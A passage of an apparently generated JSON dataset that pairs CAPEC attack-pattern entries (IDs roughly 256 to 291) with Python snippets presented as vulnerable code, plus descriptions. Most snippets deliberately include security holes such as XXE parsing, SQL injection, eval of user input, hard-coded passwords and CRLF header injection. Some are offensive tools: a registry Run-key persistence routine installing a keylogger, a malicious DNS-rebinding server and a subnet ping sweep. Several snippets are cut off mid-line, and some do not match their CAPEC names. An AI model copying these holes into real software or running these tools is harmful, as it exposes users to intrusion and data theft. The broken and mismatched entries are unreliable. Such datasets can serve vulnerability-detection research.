        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml_input(xml_string):\n    parser = ET.XMLParser()\n    try:\n        # Unsafe XML parsing allowing external DTDs and entity expansion\n        doc = ET.fromstring(xml_string, parser=parser)\n        \n        # WSDL file exposure\n        with open('service_description.wsdl', 'r') as wsdl_file:\n            wsdl_content = wsdl_file.read()\n            \n        # Debug logging with sensitive information\n        with open('debug.log', 'a') as log_file:\n            log_file.write(f'Processing XML: {xml_string}\\n')\n            log_file.write(f'WSDL Content: {wsdl_content}\\n')\n            \n        return doc\n    except Exception as e:\n        # Logging error details that might expose sensitive information\n        with open('error.log', 'a') as error_file:\n            error_file.write(str(e))",
        "description": "This vulnerable code demonstrates multiple security issues including unsafe XML parsing that allows DTD injection and entity expansion attacks, exposure of sensitive WSDL information, and unsafe logging practices. The code doesn't restrict DTD references or recursive entity definitions, potentially allowing XXE attacks. It also exposes sensitive information through debug and error logs, and makes WSDL information directly accessible."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "def process_soap_array(soap_request):\n    claimed_length = int(soap_request.get('array_size', 0))\n    data = soap_request.get('array_data', [])\n    \n    # Vulnerable: Blindly trusting claimed length without validation\n    buffer = bytearray(claimed_length)\n    \n    # Copy data without checking actual size\n    for i in range(len(data)):\n        buffer[i] = data[i]  # Potential buffer overflow if len(data) > claimed_length\n    \n    return buffer",
        "description": "Vulnerable code that processes a SOAP request containing an array, where the code trusts the claimed array size without validation against actual data length. The code allocates a buffer based on the claimed size and attempts to copy data without bounds checking, potentially leading to buffer overflow if the actual data length exceeds the claimed length."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "class UserData:\n    def __init__(self):\n        self.stored_data = {}\n        self.debug_log = open('debug.log', 'a')\n        self.server_log = open('server.log', 'a')\n    \n    def store_sensitive_info(self, user_id, data):\n        self.stored_data[user_id] = data\n        self.debug_log.write(f'Storing data for user {user_id}: {data}\\n')\n        \n    def authenticate(self, user_id):\n        # Vulnerable authentication that can be bypassed\n        return True\n    \n    def get_user_data(self, user_id):\n        if self.authenticate(user_id):\n            data = self.stored_data.get(user_id)\n            self.server_log.write(f'Retrieved data: {data}\\n')\n            return data\n        return None",
        "description": "This code demonstrates multiple deprecated security weaknesses including: unprotected stored data that can be modified, lack of data confidentiality, exposure of sensitive information through debug and server logs, and a bypassed authentication mechanism. The code fails to implement proper data protection, stores sensitive information in log files, and uses a weak authentication system."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "class AuthClient:\n    def __init__(self):\n        self.token = None\n\n    def authenticate(self, username, password):\n        # Client-side only authentication\n        if username == 'admin' and password == 'password123':\n            self.token = 'valid_token'\n            return True\n        return False\n\n    def make_request(self, data):\n        # No server-side validation, only client token check\n        if self.token:\n            import requests\n            headers = {'Authorization': self.token}\n            response = requests.post('http://api.example.com/data', \n                                   headers=headers,\n                                   data=data)\n            return response.json()\n        return None",
        "description": "This code demonstrates vulnerable client-side authentication where the authentication logic is performed entirely on the client side without server validation. The token generation and validation are done locally, making it easy for an attacker to bypass authentication by modifying the client code or capturing and replaying network traffic. The code also makes assumptions about API availability without proper error handling."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "\"\"\"\nimport socket\nimport hashlib\n\nclass AuthClient:\n    def __init__(self):\n        self.token = None\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n    def authenticate(self, username, password):\n        # Client-side only authentication\n        auth_token = hashlib.md5(f\"{username",
        "description": "\"This vulnerable code demonstrates client-side authentication that can be easily bypassed through capture-replay attacks. It uses client-side only validation, stores sensitive authentication tokens in debug logs, and lacks proper server-side verification. The authentication mechanism can be compromised by sniffing network traffic and replaying captured tokens.\""
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\nimport logging\n\nclass AuthClient:\n    def __init__(self):\n        self.auth_token = None\n        logging.basicConfig(filename='debug.log', level=logging.DEBUG)\n    \n    def authenticate(self, username, password):\n        # Client-side only authentication\n        if username == 'admin' and password == 'password':\n            self.auth_token = 'valid_token'\n            logging.debug(f'Auth successful with token: {self.auth_token}')\n            return True\n        return False\n    \n    def send_request(self, data):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            sock.connect(('server', 8080))\n            # Send authentication token in plaintext\n            sock.send(f'{self.auth_token}:{data}'.encode())\n            response = sock.recv(1024)\n            return response\n        finally:\n            sock.close()",
        "description": "This vulnerable code demonstrates multiple security issues: (1) client-side only authentication that can be bypassed by modifying the client, (2) sensitive authentication tokens logged to debug files, (3) plaintext network communication susceptible to capture-replay attacks, and (4) authentication tokens sent over unencrypted sockets that can be sniffed. The code also uses basic socket APIs that might not be available on all platforms."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "\"\"\"\ndef get_user_info(user_input):\n    try:\n        db = mysql.connector.connect(\n            host=\\\"localhost\\\",\n            user=\\\"admin\\\",\n            password=\\\"password123\\\",\n            database=\\\"users\\\"\n        )\n        cursor = db.cursor()\n        \n        # Vulnerable query construction without input validation\n        query = f\\\"SELECT * FROM users WHERE username = '{user_input",
        "description": "\"This vulnerable code demonstrates improper input validation and SQL query construction, allowing SQL injection attacks. It also exposes sensitive information through error messages and lacks proper query sanitization. The function accepts user input directly into an SQL query without validation or parameterization, and returns detailed error messages that could reveal database structure.\""
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "def process_uploaded_file(uploaded_file):\n    filename = uploaded_file.name\n    temp_dir = '/tmp/uploads/'\n    \n    if filename.endswith('.txt'):\n        temp_path = os.path.join(temp_dir, filename)\n        with open(temp_path, 'wb') as f:\n            f.write(uploaded_file.read())\n        \n        # Process file without validation\n        with open(temp_path, 'r') as f:\n            data = f.read()\n            process_data(data)\n        \n        os.remove(temp_path)\n    return True",
        "description": "This vulnerable code accepts an uploaded file and processes it based solely on the file extension without proper validation. It creates an insecure temporary file, doesn't verify the file's content or integrity, and relies only on the file extension for determining how to process it. An attacker could upload a maliciously crafted file with a .txt extension that could cause denial of service or execute malicious code when processed."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "\"\"\"\n# Global variables with wide scope\nUSER_INPUT = None\nCOMMAND = None\nDEBUG_MODE = True\n\n# Literal constants instead of symbolic constants\nMAX_RETRIES = 3\nTIMEOUT = 5000\n\ndef process_input():\n    global USER_INPUT, COMMAND\n    USER_INPUT = input('Enter command: ')\n    # Unsafe eval of user input with global variable\n    COMMAND = eval(USER_INPUT)\n\ndef execute_command():\n    global COMMAND\n    if DEBUG_MODE:\n        # Using global variables across functions\n        print(f'Executing command: {COMMAND",
        "description": "\"The code demonstrates multiple vulnerabilities including eval injection through user input, excessive use of global variables with unnecessarily wide scope, and hard-coded literal constants instead of symbolic constants. The environment variables and user input are processed unsafely, allowing for potential code injection attacks.\""
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "\"\"\"\n# Global variables accessible throughout the application\nuser_data = {",
        "description": "\"This code demonstrates multiple vulnerabilities including excessive use of global variables, dynamic variable evaluation, unnecessarily wide variable scope, and improper control of dynamically-identified variables. The code allows user input to influence variable names and uses dangerous functions like exec() and eval() for dynamic evaluation, making it susceptible to code injection attacks.\""
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "def process_user_input(user_input):\n    # Validation before canonicalization (CWE-180)\n    if '<' in user_input or '>' in user_input:\n        return 'Invalid input'\n    \n    # Canonicalize by converting to lowercase\n    normalized_input = user_input.lower()\n    \n    # Dynamic attribute modification (CWE-915)\n    class UserData:\n        def __init__(self):\n            self.data = {}\n    \n    user_obj = UserData()\n    \n    # Dangerous eval usage (CWE-95)\n    for attr_str in normalized_input.split(','):\n        key, value = attr_str.split('=')\n        command = f'user_obj.data[\"{key}\"] = {value}'\n        eval(command)\n    \n    return user_obj.data",
        "description": "This code demonstrates multiple vulnerabilities including improper validation before canonicalization, unsafe dynamic attribute modification, and eval injection. The code validates input before normalizing it, potentially missing malicious patterns. It also uses eval() to dynamically set object attributes based on user input, which could allow arbitrary code execution."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "def process_user_file(user_input):\n    # Vulnerable: validates before canonicalization and doesn't handle alternate encodings\n    if '.' not in user_input and '/' not in user_input:\n        # Basic validation but doesn't account for encoded characters\n        canonical_path = user_input.encode('utf-8').decode('utf-8')\n        filename = f'/user/files/{canonical_path}'\n        \n        # Uses user input directly in file operations\n        with open(filename, 'r') as file:\n            data = file.read()\n            \n        # Vulnerable: doesn't properly sanitize output\n        html_output = f'<div>{data}</div>'\n        return html_output",
        "description": "This vulnerable code demonstrates improper handling of alternate encodings, incorrect validation order, and inadequate input sanitization. It validates input before canonicalization, doesn't properly handle encoded characters, allows path manipulation, and directly embeds user input into HTML output without proper escaping."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\nclass UnsafeLogger:\n    def __init__(self):\n        logging.basicConfig(filename='app.log', level=logging.INFO)\n        os.chmod('app.log', 0o666)  # World-readable and writable permissions\n\n    def log_user_activity(self, user_input, user_data):\n        # Directly writing unvalidated user input to logs\n        logging.info(f'User activity: {user_input}')\n        # Logging sensitive information\n        logging.info(f'User SSN: {user_data[\"ssn\"]}')\n        logging.info(f'Credit Card: {user_data[\"cc_number\"]}')\n        # System information exposure\n        logging.info(f'Server Path: {os.getcwd()}')\n        logging.info(f'Environment: {os.environ}')\n\n    def clean_logs(self, user_role):\n        if user_role == 'user':  # No proper authentication\n            with open('app.log', 'w') as f:\n                f.write('Logs cleared by user\\n')  # Allows log tampering",
        "description": "This code demonstrates multiple logging vulnerabilities including insufficient access controls on log files, logging of sensitive data, lack of log entry validation, excessive logging of system information, and ability to manipulate log contents without proper authorization."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\ndef store_sensitive_data():\n    try:\n        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\MyApp')\n        # Store sensitive data in cleartext\n        winreg.SetValueEx(key, 'api_key', 0, winreg.REG_SZ, 'secret_api_key_123')\n        winreg.SetValueEx(key, 'password', 0, winreg.REG_SZ, 'admin_password')\n        \n        # Switch context without proper privilege management\n        admin_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\AdminSection', \n                                  0, winreg.KEY_ALL_ACCESS)\n        winreg.SetValueEx(admin_key, 'config', 0, winreg.REG_SZ, 'modified_value')\n        \n    except Exception as e:\n        pass\n    finally:\n        winreg.CloseKey(key)\n        winreg.CloseKey(admin_key)",
        "description": "This vulnerable code demonstrates storing sensitive information in cleartext within the Windows Registry and improper privilege management during context switching. The code stores API keys and passwords as plaintext in HKEY_CURRENT_USER, then attempts to modify privileged registry keys in HKEY_LOCAL_MACHINE without proper access control checks. It also lacks proper error handling and documentation of execution flow."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\ndef add_to_startup(executable_path):\n    key_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    try:\n        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)\n        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, executable_path)\n        winreg.CloseKey(key)\n        return True\n    except WindowsError:\n        return False\n\n# Default credentials for encryption (vulnerable)\nENCRYPTION_KEY = 'default_key123'\n\n# Store sensitive data in registry (vulnerable)\ndef store_credentials():\n    key_path = r'Software\\MyApp'\n    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\n    winreg.SetValueEx(key, 'UserPass', 0, winreg.REG_SZ, 'admin:password123')\n    winreg.CloseKey(key)\n\n# Add malicious executable to startup\nadd_to_startup(r'C:\\path\\to\\keylogger.exe')\nstore_credentials()",
        "description": "This vulnerable code adds a malicious executable to the Windows registry run keys for persistence, stores sensitive data in cleartext in the registry, and uses default encryption credentials. The code allows unauthorized registry modifications and stores sensitive information without proper encryption, making it susceptible to multiple security issues including unauthorized access and credential exposure."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "class SchemaHandler:\n    def __init__(self):\n        self.schema_path = 'config/schema.xml'\n        self.admin_key = 'secret_key123'\n    \n    def load_schema(self, user_provided_path=None, user_key=None):\n        # Vulnerable: Allows external control of schema path and inadequate auth\n        if user_provided_path:\n            self.schema_path = user_provided_path\n        \n        try:\n            with open(self.schema_path, 'r') as f:\n                schema_content = f.read()\n                if 'password' in schema_content:\n                    # Sensitive info not properly removed\n                    return schema_content\n                \n                # Mix trusted and untrusted data\n                if user_key:\n                    schema_content += f'\\n<!-- Modified with key: {user_key} -->'\n                \n                return schema_content\n        except Exception as e:\n            # Leaks system information in error\n            return f'Error loading schema: {str(e)} from {self.schema_path}'",
        "description": "This vulnerable code demonstrates schema manipulation by allowing external control of schema paths, mixing trusted/untrusted data, and exposing sensitive information. It allows arbitrary file reading through user-controlled paths, doesn't properly sanitize schema content, and leaks system information in error messages."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\nimport threading\n\nclass UnsecureServer:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.bind((host, port))\n        self.clients = {}\n        self.tokens = {}\n    \n    def authenticate_client(self, client_socket):\n        token = client_socket.recv(1024).decode()\n        # No verification of token source\n        # No protection against replay attacks\n        self.tokens[client_socket] = token\n        return True\n    \n    def handle_client(self, client_socket, address):\n        if self.authenticate_client(client_socket):\n            while True:\n                try:\n                    # No message integrity check\n                    message = client_socket.recv(1024).decode()\n                    if message.startswith('FORWARD:'):\n                        # No validation of destination\n                        dest_client = message.split(':')[1]\n                        content = message.split(':')[2]\n                        # Blindly forward message without verification\n                        for client in self.clients:\n                            if self.tokens[client] == dest_client:\n                                client.send(content.encode())\n                except:\n                    break\n                \n    def start(self):\n        self.server.listen(5)\n        while True:\n            client, address = self.server.accept()\n            self.clients[client] = address\n            thread = threading.Thread(target=self.handle_client, args=(client, address))\n            thread.start()",
        "description": "This code demonstrates an insecure communication protocol implementation that's vulnerable to multiple attacks. It lacks proper source verification (CWE-940), has no protection against replay attacks (CWE-294), doesn't verify message integrity (CWE-924), allows reflection attacks due to simple token-based authentication (CWE-301), and doesn't properly validate message destinations (CWE-941). The server accepts connections and forwards messages between clients without proper security controls."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "def handle_proxy_request(request):\n    # Vulnerable proxy server implementation\n    content_length = request.headers.get('Content-Length')\n    transfer_encoding = request.headers.get('Transfer-Encoding')\n    \n    # Vulnerable: doesn't properly validate conflicting headers\n    raw_request = request.raw.read()\n    \n    # Vulnerable: improper header parsing allowing CRLF injection\n    forwarded_headers = {\n        'X-Forwarded-For': request.remote_addr,\n        'X-Original-URL': request.url + '\\r\\nX-Injected: malicious'\n    }\n    \n    # Vulnerable: direct raw content forwarding without sanitization\n    response = requests.post(\n        'http://backend-server/api',\n        data=raw_request,\n        headers=forwarded_headers\n    )\n    \n    # Vulnerable: doesn't properly validate response headers\n    return response.raw.read()",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that allows HTTP request/response smuggling through multiple vectors: improper handling of Content-Length and Transfer-Encoding headers, CRLF injection in headers, and raw content forwarding without proper sanitization. The code fails to properly validate and sanitize HTTP headers and content, enabling an attacker to inject malicious content that could be interpreted differently by downstream components."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ndef check_auth(verb):\n    # Vulnerable auth check based solely on HTTP verb\n    allowed_verbs = ['GET']\n    return verb in allowed_verbs\n\n@app.route('/sensitive_data', methods=['GET', 'POST', 'PUT', 'DELETE'])\ndef get_sensitive_data():\n    # Relies only on HTTP verb for access control\n    if check_auth(request.method):\n        user_data = {\n            'ssn': '123-45-6789',\n            'credit_card': '4111-1111-1111-1111',\n            'password': 'secret123'",
        "description": "\"This vulnerable Flask application implements an authentication bypass vulnerability by relying solely on HTTP verb validation. The security check assumes HTTP verbs are immutable and trustworthy, which allows attackers to bypass access controls by modifying the HTTP method. The application also exposes sensitive data through the response and lacks proper input validation and output encoding.\""
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport dns.resolver\n\ndef perform_dns_attack():\n    # Set up malicious DNS server\n    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    dns_socket.bind(('0.0.0.0', 53))\n    \n    # Initial DNS response - public IP\n    initial_ip = '203.0.113.1'\n    \n    # After client connects, change DNS response to internal IP\n    internal_ip = '192.168.1.100'\n    \n    while True:\n        data, addr = dns_socket.recvfrom(512)\n        if is_first_request(addr):\n            response = create_dns_response(data, initial_ip)\n        else:\n            response = create_dns_response(data, internal_ip)\n        dns_socket.sendto(response, addr)\n\ndef resolve_and_connect(hostname):\n    resolver = dns.resolver.Resolver()\n    resolver.nameservers = ['attacker_dns_server']\n    \n    # Vulnerable: blindly trusting DNS resolution\n    ip = resolver.resolve(hostname, 'A')[0].to_text()\n    \n    # Connect to the resolved IP\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, 80))\n    return s",
        "description": "This code demonstrates a DNS rebinding attack where a malicious DNS server initially responds with a public IP address and then switches to an internal IP address after the client connects. The code includes vulnerable DNS resolution that blindly trusts the responses and allows binding to unrestricted IP addresses (0.0.0.0). This enables an attacker to trick clients into connecting to internal network resources that should not be publicly accessible."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "class InterProcessComm:\n    def __init__(self):\n        self.pipe_name = \"\\/\\/pipe\\/sensitive_data\"\n        self.debug_mode = True\n    \n    def send_message(self, message, security_id):\n        # No encryption of sensitive data (CWE-319)\n        # No message integrity check (CWE-924)\n        pipe = open(self.pipe_name, 'w')\n        \n        # Incorrect security ID conversion (CWE-1292)\n        converted_id = int(security_id) & 0xFF\n        \n        # Debug logic active during runtime (CWE-1313)\n        if self.debug_mode:\n            print(f\"Message: {message}\")\n            print(f\"Security ID: {security_id}\")\n        \n        # No validation of message format (CWE-707)\n        pipe.write(f\"{converted_id}:{message}\")\n        pipe.close()\n    \n    def receive_message(self):\n        pipe = open(self.pipe_name, 'r')\n        data = pipe.read()\n        \n        # No message validation or sanitization\n        security_id, message = data.split(':', 1)\n        \n        pipe.close()\n        return {'security_id': security_id, 'message': message}",
        "description": "This code demonstrates vulnerable inter-component communication through a named pipe, incorporating multiple security issues: transmission of cleartext sensitive data, lack of message integrity checks, improper security identifier conversion, enabled debug features during runtime, and insufficient message validation. The code allows for unauthorized access, message tampering, and information disclosure."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "class B2BProtocolHandler:\n    def __init__(self):\n        self.session_key = 'default_key'\n        self.trusted_roles = {'admin': 1, 'user': 2}\n\n    def process_xml_message(self, xml_data, role_id):\n        # Unsafe assumption about message structure without validation\n        message_type = xml_data.get('type')\n        user_role = str(role_id)  # Direct conversion without validation\n\n        # Incorrect handling of security identifiers\n        if user_role in self.trusted_roles:\n            # Sensitive data exposure through protocol\n            if message_type == 'PURCHASE_ORDER':\n                order_data = {\n                    'order_id': xml_data.get('order_id'),\n                    'credit_card': xml_data.get('payment_info'),  # Sensitive data transmitted\n                    'session_key': self.session_key  # Assumed immutable session key\n                }\n                return self.process_order(order_data)\n\n        return None\n\n    def process_order(self, order_data):\n        # Memory layout assumption for protocol structure\n        raw_bytes = bytes(str(order_data), 'utf-8')\n        return raw_bytes",
        "description": "This vulnerable code demonstrates a B2B protocol handler that processes XML messages without proper validation, exposes sensitive data, makes unsafe assumptions about data layout, and uses insecure authentication based on assumed-immutable data. It includes improper conversion of security identifiers, reliance on memory layout, and insertion of sensitive information into sent data."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, jsonify\nimport requests\n\napp = Flask(__name__)\n\nclass WebService:\n    def __init__(self):\n        self.authorized_functions = {'get_user_data': True, 'admin_function': False",
        "description": "\"This vulnerable code demonstrates a web service implementation that fails to properly validate and sanitize incoming requests, allows unauthorized function access through client-side enforcement, contains race conditions in context switching, and implements improper HTTP request handling. The code lacks proper message structure validation, relies on client-side security controls, and has unsafe protocol handling mechanisms.\""
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "from zeep import Client\nimport xml.etree.ElementTree as ET\n\nclass VulnerableSOAPServer:\n    def __init__(self):\n        self.client_tokens = set()\n\n    def process_soap_request(self, xml_request):\n        # Vulnerable: No XML validation or sanitization (CWE-707)\n        tree = ET.fromstring(xml_request)\n        \n        # Vulnerable: Allows external entity processing (CWE-611)\n        parser = ET.XMLParser(resolve_entities=True)\n        ET.fromstring(xml_request, parser=parser)\n        \n        # Vulnerable: Client-side only authentication (CWE-603)\n        client_token = tree.find('.//token').text\n        if client_token in self.client_tokens:\n            # Process the request without server-side validation\n            operation = tree.find('.//operation').text\n            data = tree.find('.//data').text\n            return self.execute_operation(operation, data)\n        return 'Authentication failed'\n    \n    def execute_operation(self, operation, data):\n        # Vulnerable: No request validation or sanitization\n        eval(f\"{operation}('{data}')\")  # Dangerous eval\n        return 'Operation completed'",
        "description": "A vulnerable SOAP server implementation that demonstrates multiple security issues including improper XML validation, external entity processing, client-side authentication, and capture-replay vulnerabilities. The server accepts XML requests without proper validation, processes external entities, relies on client-side tokens for authentication, and uses unsafe eval for operation execution."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "\"\"\"\nimport zeep\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n# Exposed WSDL file with sensitive information\nWSDL_URL = 'http://example.com/service?wsdl'\nclient = zeep.Client(wsdl=WSDL_URL)\n\n@app.route('/wsdl')\ndef expose_wsdl():\n    # Vulnerable: Directly exposing WSDL file without authentication\n    return send_file('service.wsdl')\n\n@app.route('/soap', methods=['POST'])\ndef soap_endpoint():\n    # Vulnerable: No protection against replay attacks\n    # No message timestamp or nonce validation\n    soap_request = request.data\n    \n    # Vulnerable: No proper authentication check\n    auth_token = request.headers.get('Authorization')\n    if auth_token:\n        # Simple token check without proper validation\n        response = client.service.process_request(soap_request)\n        return response\n    \n    # Log sensitive information\n    with open('server.log', 'a') as f:\n        f.write(f'Request: {soap_request",
        "description": "\"This vulnerable code demonstrates a SOAP web service implementation with multiple security issues: exposing sensitive WSDL information, lack of proper authentication, vulnerability to replay attacks, and logging sensitive data. The code allows direct access to WSDL files, implements weak authentication that can be bypassed, doesn't protect against capture-replay attacks, and logs sensitive information in plain text.\""
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\n\ndef create_ping_scanner():\n    try:\n        # Create raw socket for ICMP\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        \n        # Build ICMP Echo Request packet\n        icmp_type = 8  # Echo Request\n        icmp_code = 0\n        checksum = 0\n        identifier = 12345\n        sequence = 1\n        payload = b'sensitive_data_in_cleartext'\n        \n        # Pack ICMP header\n        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)\n        packet = header + payload\n        \n        # List of target hosts to scan\n        targets = ['192.168.1.' + str(i) for i in range(1, 255)]\n        \n        for target in targets:\n            # Send ping request without authentication\n            sock.sendto(packet, (target, 0))\n            \n            # Receive response without validation\n            data, addr = sock.recvfrom(1024)\n            if data:\n                print(f'Host {addr[0]} is alive')\n                \n    except socket.error as e:\n        pass\n    finally:\n        sock.close()",
        "description": "This code demonstrates a vulnerable ping scanning implementation that exhibits multiple security issues: it transmits sensitive data in cleartext, creates raw sockets without proper authorization, lacks proper error handling and alerting, and doesn't implement proper access controls. The code allows for network reconnaissance through ICMP echo requests and potentially exposes system information to unauthorized actors."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\nimport threading\n\ndef start_insecure_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(5)\n    \n    while True:\n        client, address = server.accept()\n        sensitive_data = {\n            'username': 'admin',\n            'password': 'secret123',\n            'api_key': 'abcd1234'\n        }\n        # Send sensitive data in cleartext\n        client.send(str(sensitive_data).encode())\n        client.close()\n\ndef debug_mode():\n    debug_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    # Bind to same port as main server (port stealing vulnerability)\n    debug_socket.bind(('0.0.0.0', 8080))\n    debug_socket.listen(1)\n\nif __name__ == '__main__':\n    server_thread = threading.Thread(target=start_insecure_server)\n    debug_thread = threading.Thread(target=debug_mode)\n    server_thread.start()\n    debug_thread.start()",
        "description": "This code creates a vulnerable server that exposes multiple security issues: it transmits sensitive data in cleartext, allows multiple binds to the same port, exposes an excessive attack surface through debug functionality, and makes sensitive information easily accessible to unauthorized actors through simple port scanning. The server runs on all interfaces (0.0.0.0) making it vulnerable to SYN scanning attacks."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport hashlib\n\ndef authenticate_user(client_socket):\n    # Accept initial authentication message\n    auth_msg = client_socket.recv(1024)\n    \n    # Store the authentication message for later verification\n    stored_auth = auth_msg\n    \n    # Verify first authentication\n    if verify_auth(auth_msg):\n        grant_access()\n    \n    # Vulnerable to replay - accepts same authentication message again\n    while True:\n        new_auth = client_socket.recv(1024)\n        if new_auth == stored_auth:\n            grant_access()\n            \ndef verify_auth(msg):\n    # Simplified authentication check\n    return True\n    \ndef grant_access():\n    # Grant access to protected resource\n    pass\n\n# Start server\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('localhost', 8080))\nserver.listen(1)\nclient, addr = server.accept()\nauthenticate_user(client)",
        "description": "This code demonstrates a capture-replay authentication vulnerability where network traffic containing authentication credentials can be sniffed and replayed to gain unauthorized access. The server accepts and stores an initial authentication message and continues to accept the same message repeatedly without any timestamp or nonce verification, allowing attackers to replay captured authentication messages to bypass security."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.protected_region = {'start': 0x1000, 'end': 0x2000}\n        self.unprotected_region = {'start': 0x1800, 'end': 0x2800}\n        self.shared_cache = {}\n\n    def access_memory(self, address, data=None):\n        if self._check_access(address):\n            if data:\n                self.shared_cache[address] = data\n            return self.shared_cache.get(address)\n        return None\n\n    def _check_access(self, address):\n        # Vulnerable: Overlapping regions allow bypass\n        if address >= self.unprotected_region['start'] and address <= self.unprotected_region['end']:\n            return True\n        return False\n\n    def create_resource(self, resource_type):\n        # Vulnerable: Creates emergent resources without proper controls\n        new_resource = {'type': resource_type, 'id': id(resource_type)}\n        self.shared_cache[new_resource['id']] = new_resource\n        return new_resource",
        "description": "This code demonstrates multiple security vulnerabilities including overlapping memory regions that bypass access controls, improper sharing of microarchitectural resources through a shared cache, and creation of emergent resources without proper validation. The overlapping protected and unprotected memory regions allow unauthorized access to protected memory areas, while the shared cache can lead to information leakage across execution contexts."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\ndef enumerate_mx_records(domain):\n    try:\n        # Configure resolver without validation\n        resolver = dns.resolver.Resolver(configure=False)\n        resolver.nameservers = ['8.8.8.8']\n        resolver.timeout = 2\n        resolver.lifetime = 2\n\n        # Query MX records without any validation\n        mx_records = resolver.resolve(domain, 'MX')\n        mail_servers = {}\n\n        for mx in mx_records:\n            # Extract mail server hostname without verification\n            mail_server = str(mx.exchange)\n            # Resolve IP address of mail server\n            ip = resolver.resolve(mail_server, 'A')[0].to_text()\n            mail_servers[mail_server] = ip\n            \n        # Store sensitive information in plaintext\n        with open('mail_servers.txt', 'w') as f:\n            for server, ip in mail_servers.items():\n                f.write(f'{server}: {ip}\\n')\n                \n        return mail_servers\n    except Exception as e:\n        pass\n\n# Usage without any logging or security checks\nresult = enumerate_mx_records('example.com')",
        "description": "This vulnerable code performs MX record enumeration without proper validation or security controls. It exposes sensitive mail server information, lacks proper error handling and logging, relies on unverified DNS responses, and stores sensitive data in plaintext. The code doesn't implement any access controls or rate limiting, making it easy for attackers to gather information about mail server infrastructure."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
